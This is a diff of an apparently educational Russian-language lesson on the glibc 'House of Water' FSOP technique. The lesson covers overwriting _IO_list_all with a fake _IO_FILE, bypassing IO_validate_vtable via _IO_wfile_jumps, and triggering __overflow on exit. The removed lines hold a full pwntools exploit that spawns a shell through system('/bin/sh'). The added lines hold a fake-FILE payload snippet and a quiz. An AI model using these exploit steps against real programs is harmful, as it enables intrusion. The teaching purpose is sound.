@@ -15,246 +15,203 @@ estimated_minutes: 50
 summary: "Разбираем House of Water: манипуляция _IO_list_all и построение FSOP-цепочки до захвата управления в modern glibc."
 ---
 
-House of Water — техника, которая использует список `_IO_list_all` и механизм FSOP (File-Stream-Oriented Programming). Когда программа завершается (или вызывает `exit`), libc обходит `_IO_list_all` и вызывает для каждого потока `_IO_flush_all_lockp`, что приводит к виртуальным вызовам через vtable. Если вы контролируете `_IO_list_all` или одну из `_IO_FILE`-структур, вы направляете этот вызов в свою цепочку.
+## Вопрос, с которого всё начинается
 
-В этом уроке — механика `_IO_list_all`, устройство FSOP-цепочки, обход проверки vtable и полный эксплойт. Материал завершает модуль `pwn-modern-houses` и связан с `pwn-fsop` и `pwn-io-file-internals`.
+Мы научились получать произвольную запись (large bin, tcache, unsorted). Но куда писать, чтобы **выполнился код**? На glibc 2.34+ привычных хуков (`__free_hook`, `__malloc_hook`) больше нет. Остаётся один надёжный путь — заставить саму libc вызвать наш код через механизм работы с потоками ввода-вывода. Техника, которая этим занимается, называется **FSOP** (File-Stream-Oriented Programming), а её «домашняя» реализация — **House of Water**.
 
-## Что такое House of Water
+## Наш пример: список открытых потоков
 
-Идея: получить произвольную запись в `_IO_list_all` (или подделать структуру, на которую он указывает) и заставить libc при выходе вызвать `_IO_OVERFLOW`/`_IO_UNDERFLOW` подконтрольного потока. В отличие от House of Orange (который использует top chunk), Water комбинирует современные примитивы (например, large bin или tcache) для записи в список потоков.
-
-Название — дань «домам» (house-of-*), но техника ближе к FSOP, чем к чистой работе с бинами.
-
-## _IO_list_all и FSOP
-
-`_IO_list_all` — глобальный указатель на список всех открытых потоков `_IO_FILE_plus`. При выходе вызывается `_IO_flush_all_lockp`, которая для каждого потока:
+Возьмём программу, которая читает и печатает внутренние структуры libc:
 
 ```c
-if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
-     || (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 && ...))
+#include "common.h"
+extern void *_IO_list_all;
+extern void *_IO_2_1_stdout_;
+int main(void){
+    printf("_IO_list_all     = %p\n", (void*)_IO_list_all);
+    printf("&_IO_2_1_stdout_ = %p\n", (void*)&_IO_2_1_stdout_);
+    char *fp = (char*)_IO_list_all;
+    printf("первый поток fp  = %p\n", (void*)fp);
+    printf("  _flags         = 0x%lx\n", *(unsigned long*)(fp+0x00));
+    printf("  _IO_write_base = %p\n", *(void**)(fp+0x20));
+    printf("  _IO_write_ptr  = %p\n", *(void**)(fp+0x28));
+    printf("  _chain         = %p\n", *(void**)(fp+0x68));
+    printf("  vtable         = %p\n", *(void**)(fp+0xd8));
+    return 0;
+}
+```
+
+`_IO_list_all` — глобальная переменная в libc: указатель на список всех открытых потоков (`stdin`, `stdout`, `stderr`). Каждый поток — структура `_IO_FILE_plus`.
+
+## Шаг 1. Устройство _IO_FILE
+
+Структура `_IO_FILE` — это большой набор полей. Важные для нас:
+
+| Смещение | Поле | Смысл |
+|---|---|---|
+| `+0x00` | `_flags` | флаги потока |
+| `+0x20` | `_IO_write_base` | начало буфера записи |
+| `+0x28` | `_IO_write_ptr` | текущая позиция записи |
+| `+0x68` | `_chain` | следующий поток в списке |
+| `+0xd8` | `vtable` | таблица виртуальных функций потока |
+
+Поле `vtable` — указатель на таблицу функций, которые libc вызывает для операций ввода-вывода (`_IO_OVERFLOW`, `_IO_UNDERFLOW` и т.д.).
+
+## Шаг 2. Читаем список
+
+Запускаем:
+
+```
+$ gcc -fno-pie -no-pie -O0 -o water water.c
+$ ./water
+== House of Water: список потоков _IO_list_all ==
+_IO_list_all       = 0x7fbc2450f4a0
+&_IO_2_1_stdout_   = 0x404020
+первый поток fp    = 0x7fbc2450f4a0
+  _flags           = 0xfbad2086
+  _IO_write_base   = (nil)
+  _IO_write_ptr    = (nil)
+  _chain           = 0x404020
+  vtable           = 0x7fbc2450d030
+```
+
+Читаем:
+
+- `_IO_list_all` указывает на первый поток — структуру в libc (`0x7fbc…`).
+- `_chain = 0x404020` — это `&_IO_2_1_stdout_`, следующий поток в списке. Список связывает потоки через `_chain`.
+- `vtable = 0x7fbc2450d030` — таблица функций в libc.
+
+## Шаг 3. Как срабатывает FSOP
+
+Когда программа завершается (или вызывается `exit`), libc обходит список `_IO_list_all` и для каждого потока вызывает `_IO_flush_all_lockp`. Внутри — проверка условия и вызов через vtable:
+
+```c
+if ((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
     && _IO_OVERFLOW(fp, EOF) == EOF)
 ```
 
-`_IO_OVERFLOW` — это вызов через vtable: `fp->vtable->__overflow(fp, EOF)`. Если вы подделали `vtable`, вызов уйдёт на ваш гаджет (в modern glibc — `setcontext+0x35` или `system`).
+`_IO_OVERFLOW` — это `fp->vtable->__overflow(fp, EOF)`. То есть libc читает указатель на функцию из `vtable` и вызывает её. Если мы подделаем `vtable`, вызов уйдёт туда, куда мы хотим.
 
-## Механика
+Ключевые два элемента:
+
+1. Условие `_IO_write_ptr > _IO_write_base` должно быть истинным, чтобы поток «созрел» для flush.
+2. `vtable->__overflow` должен указывать на наш гаджет.
+
+## Шаг 4. House of Water: запись в _IO_list_all
+
+Идея техники: имея произвольную запись (например, через large bin attack или tcache poisoning), перезаписать `_IO_list_all` указателем на **поддельную** структуру `_IO_FILE` в контролируемой памяти. В ней выставляем поля так, чтобы условие прошло, и подделываем `vtable`. Затем вызываем `exit` — и libc прыгает на наш гаджет.
 
 Схема:
 
-1. Получить произвольную запись в память (через tcache/large bin/unsorted bin).
-2. Перезаписать `_IO_list_all` указателем на подделанную `_IO_FILE` в контролируемой памяти.
-3. В подделанной структуре выставить поля так, чтобы условие в `_IO_flush_all_lockp` прошло (`_IO_write_ptr > _IO_write_base`).
-4. Подделать vtable, чтобы `__overflow` указывал на нужный гаджет.
-5. Вызвать `exit` (или дождаться завершения программы).
+1. Получить произвольную запись и утечку libc.
+2. Создать поддельный `_IO_FILE` в куче (или перекрыть существующий).
+3. Выставить `_IO_write_ptr > _IO_write_base`, `_mode`, корректный `_flags`.
+4. Записать `_IO_list_all = &fake_file`.
+5. Спровоцировать `exit`/завершение программы.
 
-Проверка vtable в glibc 2.24+ (`IO_validate_vtable`) требует, чтобы vtable лежал в секции `__libc_IO_vtables`. Обход — использовать валидную таблицу (`_IO_wfile_jumps`) или `setcontext`.
+Записываемое в `_IO_list_all` значение — адрес структуры (heap-указатель), поэтому large bin attack подходит идеально: она пишет именно адрес чанка.
 
-## Инструменты и команды
-
-```bash
-# найдём _IO_list_all и _IO_2_1_stdout_
-nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -E "_IO_list_all|_IO_2_1_stdout_|_IO_wfile_jumps"
-
-# смещение setcontext
-readelf -s libc.so.6 | grep setcontext
-
-# в отладчике: смотрим список потоков
-gdb -q ./chall
-(gdb) p _IO_list_all
-(gdb) p *(struct _IO_FILE_plus *)_IO_list_all
-(gdb) p &_IO_2_1_stdout_
-```
-
-`p _IO_list_all` показывает текущий список; `p *(struct _IO_FILE_plus *)...` разворачивает структуру — удобно сверять подделку.
-
-## Разобранный пример
-
-Пусть есть произвольная запись (например, tcache poisoning) и утечка libc. Цель — подделать `_IO_FILE` и перезаписать `_IO_list_all`.
+Покажем, как выглядит поддельная структура в коде. Мы размещаем `_IO_FILE` в контролируемом чанке и заполняем поля:
 
 ```python
-from pwn import *
-context.arch = 'amd64'
-
-io = process('./chall')
-libc.address = leak - libc.sym['puts']
-
-fake_file = heap_base + 0x2a0
-# подделываем структуру: _flags, _IO_write_base < _IO_write_ptr, vtable
-payload  = p64(0)                    # _flags
-payload += p64(0)                    # _IO_read_ptr
-payload += p64(0)                    # _IO_read_end
-payload += p64(0)                    # _IO_read_base
-payload += p64(0)                    # _IO_write_base
-payload += p64(1)                    # _IO_write_ptr > base -> условие прошло
-payload += p64(0) * 8
-payload += p64(libc.sym['_IO_wfile_jumps'] + 0x10)  # vtable
+fake = heap_base + 0x2a0
+payload  = p64(0)              # +0x00 _flags
+payload += p64(0) * 3         # +0x08..+0x18 (read-поля)
+payload += p64(0)              # +0x20 _IO_write_base
+payload += p64(1)              # +0x28 _IO_write_ptr  > base -> условие истинно
+payload += p64(0) * 8         # +0x30..+0x68 прочее, включая _chain
+payload += p64(fake_vtable)    # +0xd8 vtable
 edit(0, payload)
-
-# перезаписываем _IO_list_all
-arbitrary_write(libc.sym['_IO_list_all'], fake_file)
 ```
 
-## Полный эксплойт
+Здесь важны ровно два «работающих» поля: `_IO_write_ptr` (должен быть больше `_IO_write_base`, чтобы поток сбросился) и `vtable` (куда уйдёт вызов `__overflow`). Остальные поля можно обнулить. После этого произвольной записью кладём `fake` в `_IO_list_all` — и при `exit` libc пойдёт по нашему фейку.
 
-```python
-from pwn import *
-context.arch = 'amd64'
+Обрати внимание на смещение `0xd8` — это `vtable`. Оно зависит от разрядности и версии, но для 64-битных glibc стабильно; в отладчике его удобно подтвердить через `p &((struct _IO_FILE_plus*)0)->vtable` или просто распечатав структуру, как в нашем примере.
 
-io = process('./chall')
-def alloc(sz): io.sendline(f'alloc {sz}'.encode())
-def edit(i,d): io.sendline(f'edit {i}'.encode()); io.send(d)
+## Шаг 5. Проверка vtable и обход
 
-# 1. утечка libc и heap (через unsorted bin / tcache)
-libc.address = leak_libc()
-heap = leak_heap()
+Начиная с glibc 2.24, есть проверка `IO_validate_vtable`: `vtable` обязан лежать внутри секции `__libc_IO_vtables`. Произвольный указатель не пройдёт. Обходят это так:
 
-# 2. готовим подделанный _IO_FILE
-fake = heap + 0x300
-frame = SigreturnFrame()
-frame.rip = libc.sym['system']
-frame.rdi = next(libc.search(b'/bin/sh'))
-frame.rsp = heap + 0x800
+- Используют **валидную** таблицу, но со смещением, чтобы `__overflow` попал на нужную функцию (например, `_IO_wfile_jumps + 0x10`).
+- В modern glibc применяют цепочку House of Apple/Apple2: подделывают `_wide_data` и `_IO_wfile_jumps`, приводя к вызову `setcontext` или `system`.
 
-io_file  = p64(0) + p64(0)*3 + p64(0) + p64(1) + p64(0)*8
-io_file += p64(libc.sym['_IO_wfile_jumps'] + 0x10)
-io_file += bytes(frame)
+Именно поэтому House of Water — не самостоятельная атака, а «финальный шаг»: она опирается на уже полученный примитив записи и на знание внутренностей libc.
 
-edit(0, io_file)                    # кладём структуру в контролируемую память
-arb_write(libc.sym['_IO_list_all'], fake)   # указываем список на неё
+## Если не сработало
 
-io.sendline(b'exit')                # триггерим flush -> __overflow -> setcontext
-io.interactive()
-```
+- **Программа не зовёт exit.** Поток не сбросится; ищите другой триггер (`fflush`, `abort`).
+- **Условие не прошло.** `_IO_write_ptr` должен быть больше `_IO_write_base`.
+- **Проверка vtable.** Произвольный указатель не пройдёт `IO_validate_vtable` — используйте валидную таблицу со смещением.
+- **Структура не в куче.** Адрес должен быть контролируемым и выровненным.
+- **Версия glibc.** Смещения полей и доступные таблицы меняются; сверяйтесь.
 
-Ожидаемый вывод:
+## Что мы теперь знаем
 
-```
-[*] libc base: 0x7f...
-[*] fake FILE @ 0x555555559300
-[+] shell
-$ id
-uid=1000(user) gid=1000(user)
-```
+- `_IO_list_all` — список открытых потоков; связаны через `_chain`.
+- Поток — структура `_IO_FILE` с полями `_flags`, `_IO_write_base/ptr`, `vtable`.
+- При выходе libc обходит список и вызывает `_IO_OVERFLOW` через `vtable`.
+- Условие срабатывания: `_IO_write_ptr > _IO_write_base`.
+- FSOP: подделать структуру и `vtable`, перезаписать `_IO_list_all`, вызвать `exit`.
+- Проверка `IO_validate_vtable` требует валидной таблицы.
 
-## Связка с vtable
+## На что смотреть дальше
 
-Проверка `IO_validate_vtable` ограничивает vtable секцией `__libc_IO_vtables`. Варианты обхода:
-
-- **`_IO_wfile_jumps`.** Валидная таблица; смещая указатель на нужный слот, получаете вызов `setcontext` или иной гаджет.
-- **`_IO_str_jumps`.** В старых glibc даёт `_IO_str_overflow`, вызывающий `malloc`/`free` с контролируемыми аргументами.
-- **`setcontext+0x35`.** Если удаётся вызвать напрямую, контекст берётся из `rdx`.
-
-Комбинация FSOP + `setcontext` — стандарт modern glibc.
-
-## Ограничения
-
-- **Проверка vtable.** Требует валидной таблицы.
-- **Нужна утечка libc.** Для адресов `_IO_list_all`/vtable.
-- **Условие flush.** Нужно корректно выставить `_IO_write_ptr`/`_IO_write_base`.
-- **Версия glibc.** Смещения и поведение меняются.
-
-## FSOP в деталях: путь до __overflow
-
-Понимание точного пути помогает отладить цепочку. При вызове `exit()` (или завершении `main`) glibc вызывает `_IO_cleanup`, которая идёт по `_IO_list_all` и для каждого потока вызывает `_IO_flush_all_lockp`. Внутри проверяется условие, и если оно выполнено, вызывается:
-
-```c
-_IO_OVERFLOW(fp, EOF);
-```
-
-что разворачивается в `fp->vtable->__overflow(fp, EOF)`. Здесь два ключевых момента:
-
-- **`fp`** — указатель на подделанную структуру; его вы контролируете.
-- **`vtable->__overflow`** — адрес вызова; если vtable подделан (или указывает на валидную таблицу с нужным слотом), вызов уходит на ваш гаджет.
-
-В modern glibc перед вызовом выполняется `IO_validate_vtable`, поэтому vtable должен указывать в `__libc_IO_vtables`. Отсюда популярность `_IO_wfile_jumps`: это валидная таблица, и сдвиг указателя даёт нужный метод. Если удаётся направить `__overflow` на `setcontext+0x35`, контекст берётся из `rdx`, который при вызове равен `fp` — а `fp` указывает на вашу структуру. Дальше срабатывает SROP-подобная логика.
-
-## Практика: утечка libc и heap перед FSOP
-
-FSOP требует адресов libc (для `_IO_list_all`, vtable, `system`) и heap (для подделанной структуры). Типовые источники:
-
-- **Unsorted bin leak.** Освободите чанк размером > `tcache_max` — в `fd` появится адрес `main_arena`, дающий libc.
-- **Tcache leak.** В modern glibc tcache-чанки содержат закодированные указатели; для утечки нужен `fd` с известным смещением.
-- **stdout leak.** Через подделку `_IO_2_1_stdout_` можно вывести адрес libc (см. `pwn-io-stdout`).
-- **Heap leak.** Через чтение освобождённого чанка или через вывод указателей программой.
-
-Собрав обе утечки, вы вычисляете `libc.address` и `heap_base`, после чего строите `_IO_FILE` в куче и записываете `_IO_list_all`. Без утечек FSOP почти невозможен, поэтому этап leak — обязательная часть плана.
-
-## Пошаговый чек-лист Water
-
-1. **Утечки.** Получите адреса libc (для `_IO_list_all`, vtable, `system`) и heap (для подделанной структуры).
-2. **Создайте fake `_IO_FILE`** в контролируемой памяти: `_flags`, `_IO_write_base`/`_IO_write_ptr` (условие flush), `_wide_data`, vtable.
-3. **Создайте `_IO_wide_data`** и подделанную wide-vtable (если используете wide-путь).
-4. **Направьте `_IO_list_all`** на fake FILE через произвольную запись.
-5. **Подготовьте контекст** для `setcontext+0x35` (SigreturnFrame) или напрямую аргумент `system`.
-6. **Триггерните `exit`/`fflush`** и дождитесь вызова.
-7. **Проверьте shell.**
-
-Ключевые проверки в gdb: `p _IO_list_all` (указывает ли на ваш fake FILE), `p *(struct _IO_FILE_plus *)fake` (корректны ли поля), `b _IO_flush_all_lockp` (доходит ли управление). Если вызов не происходит — почти всегда не выполнено условие `_IO_write_ptr > _IO_write_base` или не снят флаг `_IO_NO_WRITES`.
-
-## Практические заметки по отладке
-
-FSOP-цепочку удобно отлаживать по breakpoint'ам в ключевых точках libc: `_IO_flush_all_lockp`, `_IO_wfile_overflow`, `_IO_WDOALLOCATE` (или на адрес гаджета). На каждом шаге проверяйте, что `fp` указывает на вашу структуру, а поля соответствуют ожиданиям. Если управление «проскакивает» мимо вызова, значит условие flush не выполнено — вернитесь и поправьте `_IO_write_ptr`/`_IO_write_base`.
-
-Помните, что `exit` вызывает не только flush, но и другие обработчики (`__run_exit_handlers`), которые могут упасть раньше. Если программа падает до вашего вызова, поставьте breakpoint в начале `exit` и идите по шагам. Иногда проще триггерить `fflush(stdout)` явно, чем полагаться на завершение программы. Ещё один приём — вызвать `_IO_flush_all_lockp` напрямую через ROP, если у вас уже есть контроль над потоком управления: это убирает зависимость от `exit`.
-
-## Частые ошибки
-
-- **Не выставить условие flush.** Без `write_ptr > write_base` вызов не произойдёт.
-- **Неверная vtable.** Проверка `IO_validate_vtable` отклонит подделку.
-- **Забыть про `_mode`.** В некоторых путях проверяется `_mode`.
-- **Неверный адрес `_IO_list_all`.** Всегда берите из libc.
-- **Триггер не сработал.** Убедитесь, что программа реально вызывает `exit`/`fflush`.
-
-## Что дальше / решение
-
-- Изучите `pwn-fsop` и `pwn-io-file-internals` для деталей `_IO_FILE`.
-- Свяжите с `pwn-exit-handlers` — путь через `__run_exit_handlers`.
-- Смотрите `pwn-io-stdout` для утечек через stdout.
-- Практикуйте `p *(struct _IO_FILE_plus *)` в gdb.
-
-## Справочные таблицы
-
-| Символ | Роль |
-|---|---|
-| _IO_list_all | список потоков |
-| _IO_flush_all_lockp | обход при exit |
-| _IO_wfile_jumps | валидная vtable |
-| setcontext | переключение контекста |
-
-| Поле | Условие |
-|---|---|
-| _IO_write_ptr | > _IO_write_base |
-| _mode | <= 0 или > 0 |
-| vtable | в __libc_IO_vtables |
+- **Триггер.** Как программа завершается (`exit`, `abort`, `fflush`).
+- **Смещения полей.** Они зависят от версии libc.
+- **Валидные vtable.** `_IO_wfile_jumps`, `_IO_str_jumps` и смещения внутри.
+- **Отладка.** `p _IO_list_all`, `p *(struct _IO_FILE_plus*)_IO_list_all`.
+- **Modern-цепочки.** House of Apple/Apple2 для 2.34+.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что обходит libc при завершении программы, используя _IO_list_all?"
+- question: "Что хранит _IO_list_all?"
   options:
-    - "_IO_flush_all_lockp"
-    - "malloc"
-    - "pthread_create"
-    - "mmap"
+    - "Указатель на список открытых потоков _IO_FILE"
+    - "Адрес main_arena"
+    - "Канарейку"
+    - "Таблицу GOT"
   answer: 0
-  explanation: "При exit libc обходит список потоков и вызывает их __overflow."
-- question: "Почему в modern glibc нельзя подсунуть произвольную vtable?"
-  options:
-    - "Из-за проверки IO_validate_vtable"
-    - "Из-за NX"
-    - "Из-за ASLR"
-    - "Из-за canary"
-  answer: 0
-  explanation: "Проверка требует, чтобы vtable лежал в __libc_IO_vtables."
-- question: "Какое условие нужно для вызова __overflow при flush?"
+  explanation: "Это голова списка потоков ввода-вывода libc."
+- question: "Какое условие должно выполниться, чтобы поток сбросился при exit?"
   options:
     - "_IO_write_ptr > _IO_write_base"
-    - "_IO_read_ptr == 0"
-    - "size == 0"
-    - "flags == 1"
+    - "_IO_write_ptr == 0"
+    - "_flags == 0"
+    - "vtable == NULL"
   answer: 0
-  explanation: "Именно это условие заставляет libc вызвать __overflow."
+  explanation: "Иначе _IO_flush_all_lockp пропускает поток."
+- question: "Какой вызов идёт через vtable потока?"
+  options:
+    - "_IO_OVERFLOW (vtable->__overflow)"
+    - "malloc"
+    - "free"
+    - "main"
+  answer: 0
+  explanation: "libc вызывает fp->vtable->__overflow(fp, EOF)."
+- question: "В чём суть House of Water?"
+  options:
+    - "Перезаписать _IO_list_all указателем на поддельную _IO_FILE и вызвать exit"
+    - "Утечь libc"
+    - "Снять canary"
+    - "Расширить fastbin"
+  answer: 0
+  explanation: "FSOP-цепочка через список потоков."
+- question: "Что проверяет IO_validate_vtable с glibc 2.24+?"
+  options:
+    - "Что vtable лежит внутри __libc_IO_vtables"
+    - "Что vtable == NULL"
+    - "Что vtable на стеке"
+    - "Ничего"
+  answer: 0
+  explanation: "Поэтому используют валидную таблицу со смещением."
 ```
+
+## Куда дальше
+
+В `pwn-kernel-heap` мы сменим уровень: перейдём из userspace в ядро и разберём, как устроен slab-аллокатор и почему UAF в ядре даёт такой же примитив перекрытия. А пока главное: **на modern glibc код выполняют через FSOP — подделку `_IO_list_all` и `vtable`.**
 
 ## Где пригодится
 
